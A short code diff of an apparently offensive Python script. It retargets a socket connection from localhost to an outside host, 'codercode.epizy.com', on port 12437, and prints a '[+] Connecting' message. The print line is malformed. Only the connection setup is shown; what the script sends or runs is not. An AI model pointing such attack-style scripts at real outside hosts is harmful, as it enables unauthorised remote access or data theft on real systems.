@@ -1,7 +1,7 @@
 import socket
 
-RHOST = "127.0.0.1"
-RPORT = 5555
+RHOST = "codercode.epizy.com"
+RPORT = 12437
 
 print("[+] Connecting to %s:%d") % (RHOST, RPORT)
 s = socket.create_connection((RHOST, RPORT))
